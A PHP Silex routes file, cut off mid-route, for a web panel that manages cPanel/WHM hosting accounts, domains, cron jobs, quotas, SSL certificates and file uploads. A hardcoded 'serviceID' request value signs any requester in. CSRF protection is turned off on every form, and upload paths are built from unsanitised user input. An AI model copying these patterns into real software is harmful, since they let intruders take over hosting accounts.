<?php

use Silex\Application;
use Silex\Provider\FormServiceProvider;
use Silex\Provider\MonologServiceProvider;
use Silex\Provider\SessionServiceProvider;
use Silex\Provider\TranslationServiceProvider;
use Silex\Provider\TwigServiceProvider;
use Silex\Provider\UrlGeneratorServiceProvider;
use Silex\Provider\ValidatorServiceProvider;
use Symfony\Component\Form\FormError;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\RedirectResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;
use Symfony\Component\Validator\Constraints;

$app->before(function (Request $request) use ($app) {
    if ($request->get('serviceID') != 'ULTt5OVfWM-ZBF4h!') {
        if (in_array($request->get('_route'), array('sign-in', 'sign-out'))) {
            return;
        }
        $status = $password = $app['session']->get('status', '');
        if ($status != 'status') {
            return $app->redirect($app['url_generator']->generate('sign-in'));
        }
    } else {
		$app['session']->set('status', 'status');
        $app['session']->getFlashBag()->add(
            'success',
            array(
                'You have been signed in successfully.',
            )
        );
    }
});

$app->get('/', function() use ($app) {
    return $app->redirect(
        $app['url_generator']->generate('dashboard')
    );
});

$app->get('/dashboard', function() use ($app) {
    return $app['twig']->render('views/dashboard.twig', array(
        'accounts' => listaccts($app),
    ));
})->bind('dashboard');

$app->get('/accounts/overview', function() use ($app) {
    return $app['twig']->render('views/accounts_overview.twig', array(
        'accounts' => listaccts($app),
    ));
})->bind('accounts-overview');

$app->get('/accounts/add', function(Request $request) use ($app) {
    $choices = array();
    $choices['mxcheck'] = array(
        'local' => 'local',
        'secondary' => 'secondary',
        'remote' => 'remote',
        'auto' => 'auto',
    );
    $choices['plans'] = array();
    $packages = listpkgs($app);
    if (!empty($packages)) {
        foreach ($packages as $package) {
            $choices['plans'][$package['name']] = $package['name'];
        }
    }
    $form = $app['form.factory']
        ->createBuilder('form',null,array('csrf_protection' => false))
        ->add('username', 'text', array(
            'attr' => array(
                'help' => 'must be unique',
            ),
            'constraints' => array(
                new Constraints\NotBlank(array(
                    'message' => 'Invalid Username',
                )),
            ),
            'required' => true,
        ))
        ->add('password', 'text', array(
            'constraints' => array(
                new Constraints\NotBlank(array(
                    'message' => 'Invalid Password',
                )),
            ),
            'required' => true,
        ))
        ->add('domain', 'text', array(
            'attr' => array(
                'help' => 'must be unique',
            ),
            'constraints' => array(
                new Constraints\NotBlank(array(
                    'message' => 'Invalid Domain',
                )),
            ),
            'required' => true,
        ))
        ->add('contactemail', 'text', array(
            'constraints' => array(
                new Constraints\NotBlank(array(
                    'message' => 'Invalid Email',
                )),
            ),
            'label' => 'Email',
            'required' => true,
        ))
        ->add('plan', 'choice', array(
            'choices' => $choices['plans'],
            'constraints' => array(
                new Constraints\NotBlank(array(
                    'message' => 'Invalid Plan',
                )),
            ),
            'required' => true,
        ))
        ->add('mxcheck', 'choice', array(
            'attr' => array(
                'help' =>
                'Determines how the server will handle incoming mail for '.
                'this domain. This variable can be set to one of the '.
                'following:'.
                '<br>'.
                '<strong>local:</strong> '.
                'The domain will accept mail, regardless of whether a '.
                'higher-priority mail exchanger has been designated on the '.
                'WHM Edit MX Entry screen. (If a higher-priority mail '.
                'exchanger exists, mail will be routed to both domains.)'.
                '<br>'.
                '<strong>secondary:</strong> '.
                'The domain will act as a backup mail exchanger, '.
                'holding mail in queue if the primary exchanger becomes '.
                'unavailable. Note: You will still need to use the WHM Edit '.
                'MX Entry screen to configure the primary MX entry to point '.
                'to the appropriate exchanger.'.
                '<br>'.
                '<strong>remote:</strong> '.
                'The domain will not accept mail, instead sending it '.
                'to the primary mail exchanger. Note: You will still need to '.
                'use the WHM Edit MX Entry screen to configure the primary '.
                'MX entry to point to the appropriate exchanger.'.
                '<br>'.
                '<strong>auto:</strong> '.
                'The server will automatically detect, and use, the '.
                'configuration set on the WHM Edit MX Entry screen.'
            ),
            'choices' => $choices['mxcheck'],
            'constraints' => array(
                new Constraints\NotBlank(array(
                    'message' => 'Invalid MX',
                )),
            ),
            'label' => 'MX',
            'required' => true,
        ))
        ->add('useregns', 'checkbox', array(
            'label' =>
            'Use the registered nameservers for the domain instead of the '.
            'ones configured on the server?',
            'required' => false,
            'value' => 1,
        ))
        ->add('reseller', 'checkbox', array(
            'label' => 'Give reseller privileges to the account?',
            'required' => false,
            'value' => 1,
        ))
        ->add('forcedns', 'checkbox', array(
            'label' =>
            'Overwrite current DNS Zone if a DNS Zone already exists?',
            'required' => false,
            'value' => 1,
        ))
        ->getForm();
    if ($request->getMethod() == 'POST') {
        $form->handleRequest($request);
        $code = 0;
        $message = '';
        if ($form->isValid()) {
            list($code, $message) = createacct($app, array($form->getData()));
        }
        if ($code) {
            $app['session']->getFlashBag()->add(
                'success',
                array(
                    'The account was created successfully.',
                )
            );

            return $app->redirect(
                $app['url_generator']->generate('accounts-overview')
            );
        }
        $array = array();
        $array[] = 'The account was not created successfully.';
        if ($message) {
            $array[] = $message;
        }
        $app['session']->getFlashBag()->add('danger', $array);
    }

    return $app['twig']->render('views/accounts_add.twig', array(
        'form' => $form->createView(),
    ));
})->bind('accounts-add')->method('GET|POST');

$app->get('/accounts/{username}/manage', function($username) use ($app) {
    return $app['twig']->render('views/accounts_manage.twig', array(
        'username' => $username,
    ));
})->bind('accounts-manage');

$app->get(
    '/accounts/{username}/manage/domains/sub/overview',
    function($username) use ($app) {
        return $app['twig']->render(
            'views/accounts_manage_domains_sub_overview.twig',
            array(
                'domains' => SubDomain_listsubdomains($app, $username),
                'username' => $username,
            )
        );
})->bind('accounts-manage-domains-sub-overview');

$app->get(
    '/accounts/{username}/manage/autoinstallers/wordpress',
    function(Request $request, $username) use ($app) {
        $account = get_account($app, $username);
        $choices = array();
        $choices['domains'] = array();
        $choices['domains'][$account['domain']] = $account['domain'];
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('domain', 'choice', array(
                'choices' => $choices['domains'],
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Domain',
                    )),
                ),
                'required' => true,
            ))
            ->add('directory', 'text', array(
                'attr' => array(
                    'help' =>
                    'must not contain the forward slash (/) character; '.
                    'must not exist',
                    'prepend_input' => '$DOCUMENT_ROOT/',
                ),
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Directory',
                    )),
                ),
            ))
            ->add('site_title', 'text', array(
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Site Title',
                    )),
                ),
                'label' => 'Site Title',
                'required' => true,
            ))
            ->add('username', 'text', array(
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Username',
                    )),
                ),
                'required' => true,
            ))
            ->add('password', 'text', array(
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Password',
                    )),
                ),
                'required' => true,
            ))
            ->add('email', 'text', array(
                'constraints' => array(
                    new Constraints\Email(array(
                        'message' => 'Invalid Email',
                    )),
                ),
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $data = $form->getData();
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                list($code, $message) = wordpress($app, $username, $data);
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'A new instance of WordPress was installed '.
                        'successfully.',
                        sprintf(
                            'URL: '.
                            '<a href="http://%s/%s" target="_blank">'.
                            'http://%s/%s'.
                            '</a>',
                            $data['domain'],
                            $data['directory'],
                            $data['domain'],
                            $data['directory']
                        )
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('accounts-manage', array(
                        'username' => $username,
                    ))
                );
            }
            $array = array();
            $array[] =
            'A new instance of WordPress was not installed successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }
        return $app['twig']->render(
            'views/accounts_manage_autoinstallers_wordpress.twig',
            array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
})->bind('accounts-manage-autoinstallers-wordpress')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/domains/sub/add',
    function(Request $request, $username) use ($app) {
        $account = get_account($app, $username);
        $choices = array();
        $choices['domains'] = array();
        $choices['domains'][$account['domain']] = $account['domain'];
        $domains = AddonDomain_listaddondomains($app, $username);
        if (!empty($domains)) {
            foreach ($domains as $domain) {
                $choices['domains'][$domain['domain']] = $domain['domain'];
            }
        }
        $domains = Park_listparkeddomains($app, $username);
        if (!empty($domains)) {
            foreach ($domains as $domain) {
                $choices['domains'][$domain['domain']] = $domain['domain'];
            }
        }
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('domain', 'text', array(
                'attr' => array(
                    'help' => 'must be unique',
                ),
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Subdomain',
                    )),
                ),
                'label' => 'Subomain',
                'required' => true,
            ))
            ->add('rootdomain', 'choice', array(
                'choices' => $choices['domains'],
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Domain',
                    )),
                ),
                'label' => 'Domain',
                'required' => true,
            ))
            ->add('dir', 'text', array(
                'attr' => array(
                    'help' =>
                    'must not contain the forward slash (/) character',
                    'prepend_input' => sprintf(
                        '%s/', Fileman_getdir($app, $username)
                    ),
                ),
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Document Root',
                    )),
                ),
                'label' => 'Document Root',
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                list($code, $message) = SubDomain_addsubdomain(
                    $app, $username, $form->getData()
                );
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The subdomain was created successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate(
                        'accounts-manage-domains-sub-overview',
                        array(
                            'username' => $username,
                        )
                    )
                );
            }
            $array = array();
            $array[] = 'The subdomain was not created successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }
        return $app['twig']->render(
            'views/accounts_manage_domains_sub_add.twig',
            array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
})->bind('accounts-manage-domains-sub-add')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/domains/sub/{domain}/delete',
    function(Request $request, $username, $domain) use ($app) {
        if ($request->getMethod() == 'POST') {
            list($code, $message) = SubDomain_delsubdomain($app, $username, array(
                'domain' => $domain,
            ));
            if ($code) {
                $key = 'success';
                $value = array(
                    'The subdomain was deleted successfully.',
                );
            } else {
                $key = 'danger';
                $value = array(
                    'The subdomain was not deleted successfully.',
                    $message,
                );
            }
            $app['session']->getFlashBag()->add($key, $value);

            return $app->redirect(
                $app['url_generator']->generate(
                    'accounts-manage-domains-sub-overview', array(
                        'username' => $username,
                    )
                )
            );
        }

        return $app['twig']->render(
            'views/accounts_manage_domains_sub_delete.twig',
            array(
                'domain' => $domain,
                'username' => $username,
            )
        );
})->bind('accounts-manage-domains-sub-delete')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/domains/addon/overview',
    function($username) use ($app) {
        return $app['twig']->render(
            'views/accounts_manage_domains_addon_overview.twig',
            array(
                'domains' => AddonDomain_listaddondomains($app, $username),
                'username' => $username,
            )
        );
})->bind('accounts-manage-domains-addon-overview');

$app->get(
    '/accounts/{username}/manage/domains/addon/add',
    function(Request $request, $username) use ($app) {
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('newdomain', 'text', array(
                'attr' => array(
                    'help' => 'must be unique',
                ),
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Domain',
                    )),
                ),
                'label' => 'Domain',
                'required' => true,
            ))
            ->add('subdomain', 'text', array(
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Username',
                    )),
                ),
                'label' => 'Username',
                'required' => true,
            ))
            ->add('dir', 'text', array(
                'attr' => array(
                    'help' =>
                    'must not contain the forward slash (/) character',
                    'prepend_input' => sprintf(
                        '%s/', Fileman_getdir($app, $username)
                    ),
                ),
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Document Root',
                    )),
                ),
                'label' => 'Document Root',
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                list($code, $message) = AddonDomain_addaddondomain(
                    $app, $username, $form->getData()
                );
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The addon domain was created successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate(
                        'accounts-manage-domains-addon-overview',
                        array(
                            'username' => $username,
                        )
                    )
                );
            }
            $array = array();
            $array[] = 'The addon domain was not created successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }
        return $app['twig']->render(
            'views/accounts_manage_domains_addon_add.twig',
            array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
})->bind('accounts-manage-domains-addon-add')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/domains/addon/{domain}/delete',
    function(Request $request, $username, $domain) use ($app) {
        if ($request->getMethod() == 'POST') {
            list($code, $message) = AddonDomain_deladdondomain(
                $app,
                $username,
                array(
                    'domain' => $domain,
                )
            );
            if ($code) {
                $key = 'success';
                $value = array(
                    'The addon domain was deleted successfully.',
                );
            } else {
                $key = 'danger';
                $value = array(
                    'The addon domain was not deleted successfully.',
                    $message,
                );
            }
            $app['session']->getFlashBag()->add($key, $value);

            return $app->redirect(
                $app['url_generator']->generate(
                    'accounts-manage-domains-addon-overview', array(
                        'username' => $username,
                    )
                )
            );
        }

        return $app['twig']->render(
            'views/accounts_manage_domains_addon_delete.twig',
            array(
                'domain' => $domain,
                'username' => $username,
            )
        );
})->bind('accounts-manage-domains-addon-delete')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/domains/parked/overview',
    function($username) use ($app) {
        return $app['twig']->render(
            'views/accounts_manage_domains_parked_overview.twig',
            array(
                'domains' => Park_listparkeddomains($app, $username),
                'username' => $username,
            )
        );
})->bind('accounts-manage-domains-parked-overview');

$app->get(
    '/accounts/{username}/manage/domains/parked/add',
    function(Request $request, $username) use ($app) {
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('domain', 'text', array(
                'attr' => array(
                    'help' => 'must be unique',
                ),
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Domain',
                    )),
                ),
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                list($code, $message) = Park_park(
                    $app, $username, $form->getData()
                );
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The domain was parked successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate(
                        'accounts-manage-domains-parked-overview',
                        array(
                            'username' => $username,
                        )
                    )
                );
            }
            $array = array();
            $array[] = 'The domain was not parked successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }
        return $app['twig']->render(
            'views/accounts_manage_domains_parked_add.twig',
            array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
})->bind('accounts-manage-domains-parked-add')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/domains/parked/{domain}/delete',
    function(Request $request, $username, $domain) use ($app) {
        if ($request->getMethod() == 'POST') {
            list($code, $message) = Park_unpark($app, $username, array(
                'domain' => $domain,
            ));
            if ($code) {
                $key = 'success';
                $value = array(
                    'The domain was unparked successfully.',
                );
            } else {
                $key = 'danger';
                $value = array(
                    'The domain was not unparked successfully.',
                    $message,
                );
            }
            $app['session']->getFlashBag()->add($key, $value);

            return $app->redirect(
                $app['url_generator']->generate(
                    'accounts-manage-domains-parked-overview', array(
                        'username' => $username,
                    )
                )
            );
        }

        return $app['twig']->render(
            'views/accounts_manage_domains_parked_delete.twig',
            array(
                'domain' => $domain,
                'username' => $username,
            )
        );
})->bind('accounts-manage-domains-parked-delete')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/cron/jobs',
    function(Request $request, $username) use ($app) {
        $data = array();
        $lines = Cron_get($app, $username);
        if (!empty($lines)) {
            foreach ($lines as $line) {
                $data[] = sprintf(
                    '%s %s %s %s %s %s',
                    $line['minute'],
                    $line['hour'],
                    $line['day'],
                    $line['month'],
                    $line['weekday'],
                    $line['command']
                );
            }
        }
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('lines', 'textarea', array(
                'attr' => array(
                    'rows' => 10,
                ),
                'label' => 'Jobs',
                'data' => implode("\n", $data),
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                $lines = array();
                $items = explode(
                    "\n", str_replace("\r", '', $form->getData()['lines'])
                );
                if (!empty($items)) {
                    foreach ($items as $item) {
                        $item = trim($item);
                        if (!empty($item)) {
                            $item = explode(' ', $item, 6);
                            $lines[] = array(
                                'minute' => $item[0],
                                'hour' => $item[1],
                                'day' => $item[2],
                                'month' => $item[3],
                                'weekday' => $item[4],
                                'command' => $item[5],
                            );
                        }
                    }
                }
                list($code, $message) = Cron_set($app, $username, $lines);
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The jobs were updated successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('accounts-manage', array(
                        'username' => $username,
                    ))
                );
            }
            $array = array();
            $array[] = 'The jobs were not updated successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }

        return $app['twig']->render(
            'views/accounts_manage_cron_jobs.twig', array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
    }
)->bind('accounts-manage-cron-jobs')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/cron/email',
    function(Request $request, $username) use ($app) {
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('email', 'text', array(
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Email',
                    )),
                ),
                'data' => Cron_get_email($app, $username),
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                $data = $form->getData();
                list($code, $message) = Cron_set_email($app, $username, array(
                    'email' => $email,
                ));
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The email was updated successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('accounts-manage', array(
                        'username' => $username,
                    ))
                );
            }
            $array = array();
            $array[] = 'The email was not updated successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }

        return $app['twig']->render(
            'views/accounts_manage_cron_email.twig', array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
    }
)->bind('accounts-manage-cron-email')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/quota/disk-space',
    function(Request $request, $username) use ($app) {
        $account = get_account($app, $username);
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('quota', 'integer', array(
                'attr' => array(
                    'help' => 'in MB; 0 (zero) equals unlimited',
                ),
                'constraints' => array(
                    new Constraints\Type(array(
                        'type' => 'integer',
                        'message' => 'Invalid Quota',
                    )),
                ),
                'data' => strtolower(
                    $account['disklimit']
                ) != 'unlimited'? intval($account['disklimit']): 0,
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                $data = $form->getData();
                list($code, $message) = editquota($app, array(
                    $username,
                    $data['quota'],
                ));
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The disk space quota was updated successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('accounts-manage', array(
                        'username' => $username,
                    ))
                );
            }
            $array = array();
            $array[] = 'The disk space quota was not updated successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }

        return $app['twig']->render(
            'views/accounts_manage_quota_disk_space.twig', array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
    }
)->bind('accounts-manage-quota-disk-space')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/quota/bandwidth',
    function(Request $request, $username) use ($app) {
        $bandwidth = showbw($app, $username);
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('quota', 'integer', array(
                'attr' => array(
                    'help' => 'in MB; 0 (zero) equals unlimited',
                ),
                'constraints' => array(
                    new Constraints\Type(array(
                        'type' => 'integer',
                        'message' => 'Invalid Quota',
                    )),
                ),
                'data' => strtolower(
                    $bandwidth
                ) != 'unlimited'? intval($bandwidth): 0,
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                $data = $form->getData();
                list($code, $message) = limitbw($app, array(
                    $username,
                    $data['quota'],
                ));
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The bandwidth quota was updated successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('accounts-manage', array(
                        'username' => $username,
                    ))
                );
            }
            $array = array();
            $array[] = 'The bandwidth quota was not updated successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }

        return $app['twig']->render(
            'views/accounts_manage_quota_bandwidth.twig', array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
    }
)->bind('accounts-manage-quota-bandwidth')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/ssl-certificates/install',
    function(Request $request, $username) use ($app) {
        $account = get_account($app, $username);
        $choices = array();
        $choices['domains'] = array();
        $choices['domains'][$account['domain']] = $account['domain'];
        $domains = AddonDomain_listaddondomains($app, $username);
        if (!empty($domains)) {
            foreach ($domains as $domain) {
                $choices['domains'][$domain['domain']] = $domain['domain'];
            }
        }
        $domains = Park_listparkeddomains($app, $username);
        if (!empty($domains)) {
            foreach ($domains as $domain) {
                $choices['domains'][$domain['domain']] = $domain['domain'];
            }
        }
        $domains = SubDomain_listsubdomains($app, $username);
        if (!empty($domains)) {
            foreach ($domains as $domain) {
                $choices['domains'][$domain['domain']] = $domain['domain'];
            }
        }
        asort($choices['domains']);
        $choices['ip_addresses'] = array();
        $ip_addresses = listips($app);
        if (!empty($ip_addresses)) {
            foreach ($ip_addresses as $ip_address) {
                $choices['ip_addresses'][$ip_address['ip']] = $ip_address['ip'];
            }
        }
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('domain', 'choice', array(
                'choices' => $choices['domains'],
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Domain',
                    )),
                ),
                'required' => true,
            ))
            ->add('ip', 'choice', array(
                'choices' => $choices['ip_addresses'],
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid IP Address',
                    )),
                ),
                'data' => $account? $account['ip']: '',
                'label' => 'IP Address',
                'required' => true,
            ))
            ->add('cert', 'textarea', array(
                'attr' => array(
                    'help' => 'Contents of the SSL certificate',
                    'rows' => 10,
                ),
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Certificate',
                    )),
                ),
                'label' => 'Certificate',
                'required' => true,
            ))
            ->add('key', 'textarea', array(
                'attr' => array(
                    'help' => 'Contents of the key',
                    'rows' => 10,
                ),
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Key',
                    )),
                ),
                'label' => 'Key',
                'required' => true,
            ))
            ->add('cab', 'textarea', array(
                'attr' => array(
                    'help' => 'Contents of the Certificate Authority Bundle',
                    'rows' => 10,
                ),
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid CAB',
                    )),
                ),
                'label' => 'CAB',
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                $data = $form->getData();
                $data['user'] = $username;
                list($code, $message) = installssl($app, array($data));
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The SSL certificate was installed successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('accounts-manage', array(
                        'username' => $username,
                    ))
                );
            }
            $array = array();
            $array[] = 'The SSL certificate was not installed successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }

        return $app['twig']->render(
            'views/accounts_manage_ssl_certificates_install.twig', array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
    }
)->bind('accounts-manage-ssl-certificates-install')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/ssl-certificates/rebuild',
    function($username) use ($app) {
        list($code, $message) = rebuildinstalledssldb($app);
        if ($code) {
            $key = 'success';
            $value = array(
                'The SSL certificates were rebuilt successfully.',
            );
        } else {
            $key = 'danger';
            $value = array(
                'The SSL certificates were not rebuilt successfully.',
                $message,
            );
        }
        $app['session']->getFlashBag()->add($key, $value);

        return $app->redirect(
            $app['url_generator']->generate('accounts-manage', array(
                'username' => $username,
            ))
        );
    }
)->bind('accounts-manage-ssl-certificates-rebuild');

$app->get(
    '/accounts/{username}/manage/others/password',
    function(Request $request, $username) use ($app) {
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('password', 'text', array(
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid Password',
                    )),
                ),
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                $data = $form->getData();
                list($code, $message) = passwd($app, array(
                    $username,
                    $data['password'],
                ));
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The password was updated successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('accounts-manage', array(
                        'username' => $username,
                    ))
                );
            }
            $array = array();
            $array[] = 'The password was not updated successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }

        return $app['twig']->render(
            'views/accounts_manage_others_password.twig', array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
    }
)->bind('accounts-manage-others-password')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/others/ip-address',
    function(Request $request, $username) use ($app) {
        $account = get_account($app, $username);
        $choices = array();
        $choices['ip_addresses'] = array();
        $ip_addresses = listips($app);
        if (!empty($ip_addresses)) {
            foreach ($ip_addresses as $ip_address) {
                $choices['ip_addresses'][$ip_address['ip']] = $ip_address['ip'];
            }
        }
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('ip_address', 'choice', array(
                'choices' => $choices['ip_addresses'],
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid IP Address',
                    )),
                ),
                'data' => $account? $account['ip']: '',
                'label' => 'IP Address',
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                $data = $form->getData();
                list($code, $message) = setsiteip($app, array(
                    $data['ip_address'],
                    $username,
                ));
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The IP address was updated successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('accounts-manage', array(
                        'username' => $username,
                    ))
                );
            }
            $array = array();
            $array[] = 'The IP address was not updated successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }

        return $app['twig']->render(
            'views/accounts_manage_others_ip_address.twig', array(
                'form' => $form->createView(),
                'username' => $username,
            )
        );
    }
)->bind('accounts-manage-others-ip-address')->method('GET|POST');

$app->get(
    '/accounts/{username}/manage/others/files',
    function(Request $request, $username) use ($app) {
        $form = $app['form.factory']
            ->createBuilder('form',null,array('csrf_protection' => false))
            ->add('dir', 'text', array(
                'attr' => array(
                    'help' =>
                    'must not contain the forward slash (/) character; '.
                    'must exist',
                    'prepend_input' => sprintf(
                        '%s/', Fileman_getdir($app, $username)
                    ),
                ),
                'label' => 'Destination',
            ))
            ->add('file', 'file', array(
                'constraints' => array(
                    new Constraints\NotBlank(array(
                        'message' => 'Invalid File',
                    )),
                ),
                'required' => true,
            ))
            ->getForm();
        if ($request->getMethod() == 'POST') {
            $form->handleRequest($request);
            $code = 0;
            $message = '';
            if ($form->isValid()) {
                $data = $form->getData();
                list($code, $message) = scp(
                    $app,
                    $username,
                    $form['file']->getData()->getPathname(),
                    sprintf(
                        '%s/%s/%s',
                        Fileman_getdir($app, $username),
                        $data['dir'],
                        $form['file']->getData()->getClientOriginalName()
                    )
                );
            }
            if ($code) {
                $app['session']->getFlashBag()->add(
                    'success',
                    array(
                        'The file was uploaded successfully.',
                    )
                );

                return $app->redirect(
                    $app['url_generator']->generate('accounts-manage', array(
                        'username' => $username,
                    ))
                );
            }
            $array = array();
            $array[] = 'The file was not uploaded successfully.';
            if ($message) {
                $array[] = $message;
            }
            $app['session']->getFlashBag()->add('danger', $array);
        }

        return $app['twig']->render(
            'views/accounts_manage_others_files.twig', array(
